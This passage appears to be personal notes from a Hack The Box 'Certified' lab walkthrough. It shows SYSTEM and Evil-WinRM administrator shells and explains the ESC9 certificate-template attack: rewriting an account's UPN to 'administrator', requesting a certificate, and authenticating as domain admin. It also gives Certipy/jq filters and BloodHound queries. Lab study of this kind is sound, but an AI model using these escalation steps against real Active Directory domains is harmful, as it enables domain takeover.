[*] Opening SVCManager on 10.10.11.41.....
[*] Creating service NIRk on 10.10.11.41.....
[*] Starting service NIRk.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.6414]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

---OUTPUT-WINRM---
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator
```
- We grab the root flag

-------
--------
## Extra Notes : Ippsec
- in nmap Simple DNS Plus implies AD
- initially when you pass the certipy command without the `-vulnerable` argument you can see more information and here you can see a non default thing where the CertifiedAuthentication template allows operator_ca to enroll (so is a high value target)
- I tried the certipy `-bloodhound` argument but bloodhound couldn't read it
- they are broken for bloodhound so we can't use it
- instead we can download via `-json` to pass jqueries.
- To find vulnerable target:
```bash
vi filter.sh
chmod +x filter.sh
cat filter.sh

--FILTER-SH-CONTENT--
cat 20250416152419_Certipy.json | jq '."Certificate Templates" | to_entries[] | select(all(.value.Permissions."Enrollment Permissions"."Enrollment Rights"[]; test("domain";"i") or test("enterprise";"i") or test("RAS";"i")) | not)'

---FILTER-SH-OUTPUT---
{
  "key": "0",
  "value": {
    "Template Name": "CertifiedAuthentication",
    "Display Name": "Certified Authentication",
    "Certificate Authorities": [
      "certified-DC01-CA"
    ],
    "Enabled": true,
    "Client Authentication": true,
    "Enrollment Agent": false,
    "Any Purpose": false,
    "Enrollee Supplies Subject": false,
    "Certificate Name Flag": [
      "SubjectRequireDirectoryPath",
      "SubjectAltRequireUpn"
    ],
    "Enrollment Flag": [
      "NoSecurityExtension",
      "AutoEnrollment",
      "PublishToDs"
    ],
    "Private Key Flag": [
      "16842752"
    ],
    "Extended Key Usage": [
      "Server Authentication",
      "Client Authentication"
    ],
    "Requires Manager Approval": false,
    "Requires Key Archival": false,
    "Authorized Signatures Required": 0,
    "Validity Period": "1000 years",
    "Renewal Period": "6 weeks",
    "Minimum RSA Key Length": 2048,
    "Permissions": {
      "Enrollment Permissions": {
        "Enrollment Rights": [
          "CERTIFIED.HTB\\operator ca", **
          "CERTIFIED.HTB\\Domain Admins",
          "CERTIFIED.HTB\\Enterprise Admins"
        ]
      },
      "Object Control Permissions": {
        "Owner": "CERTIFIED.HTB\\Administrator",
        "Write Owner Principals": [
          "CERTIFIED.HTB\\Domain Admins",
          "CERTIFIED.HTB\\Enterprise Admins",
          "CERTIFIED.HTB\\Administrator"
        ],
        "Write Dacl Principals": [
          "CERTIFIED.HTB\\Domain Admins",
          "CERTIFIED.HTB\\Enterprise Admins",
          "CERTIFIED.HTB\\Administrator"
        ],
        "Write Property Principals": [
          "CERTIFIED.HTB\\Domain Admins",
          "CERTIFIED.HTB\\Enterprise Admins",
          "CERTIFIED.HTB\\Administrator"
        ]
      }
    }
  }
}

```
- Can use Pathfinding in bloodhound to trace path from judith to operator_ca
- when we pass owneredit command we can run it again to see if the output shows the change (under distinguished name it should be judith.mader the second time)
- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
- a good read for ESC9 exploit
- Basic idea:
- we need generic write over an account
- what we do is:
- we take ca_account (where we have generic all over) and we rewrite the upn to be administrator
- you may think it may conflict with the default domain admin but the upn for the default domain admin is administrator@domain
- so we kind of create this duplicate scenario of the upn of administrator
- and then we use write again to request a certificate on behalf of the user
- that certificate will have upn of administrator
- then we change the upn away
- It won't work as Administrator (shows a mismatch between user 'administrator' error)
- But will work if you set upn as literally anything else
- can check the certificate file:
```bash
openssl pkcs12 -in adminsitrator.pfx -clcerts -nokeys -out adminsitrator.pem
<no pwd>
openssl x509 -in administrator.pem -text -noout
```
- can see issuer, subject
- If you scroll all the way down
- we see subject alternate name as UPN admin
- this is what is doing the auth
- if we changed upn to something else, thats what it would put here.
- Also note, even for me when i first tried to authorize i got some kind of connection error and it worked after just like when ippsec tried
- wonder why..
- and then when we use the certificate later, it works to the domain administrator
### Small idea on Cipher queries to find things you want in BloodHound
- Things can get hidden if we just do shortest paths so queries can be very useful in complex networks.
- Talks about using queries with bloodhound (difrent platform than mine i think..cant find these options)
- but the queries work so I added them to check:
```bash

#Match all usrs who have PSRemote permission to computer
$|MATCH p=(m:User)-[:CanPSRemote]->[:Computer]
RETURN p

# 

MATCH (s)
WHERE COALESCE(s.system_tags, '') CONTAINS
'owned'
match (t:Certtemplate {name:
"CERTIFIEDAUTHENTICATION@CERTIFIED.HTB"})
match p=allShortestPaths((s)-[*1..]->(t))
return p
LIMIT 100
```
- Requires to run SharpHound.exe to get ADCS information after which these quieries work (query 1 works without)
- Or RustHound
